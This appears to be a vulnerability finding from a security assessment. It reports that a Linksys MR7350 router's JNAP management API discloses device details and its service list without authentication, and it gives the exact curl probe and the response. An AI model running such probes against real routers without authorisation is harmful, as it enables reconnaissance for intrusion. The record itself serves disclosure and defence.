title: JNAP management API exposed without authentication: unauthenticated POST /JNAP/ discloses full device info (model, serial, firmware) and the complete ~100-URI JNAP service surface on both 80 and 443

evidence.command: curl -sS --max-time 15 -X POST http://192.0.2.1/JNAP/ -H 'X-JNAP-Action: http://linksys.com/jnap/core/GetDeviceInfo' -H 'Content-Type: application/json' -d '{}'  (no credentials, no session, no auth headers sent)
evidence.output: {"result": "OK", "output": {"manufacturer": "Linksys", "modelNumber": "MR7350", "serialNumber": "REDACTED", "firmwareVersion": "1.1.7.216943", "services": [ ... ]}} [HTTP 200] -- identical result over HTTPS 443. Note: the short action form '/jnap/core/GetDeviceInfo' returns {"result": "_ErrorUnknownAction"}; the canonical form 'http://linksys.com/jnap/core/GetDeviceInfo' returns OK.
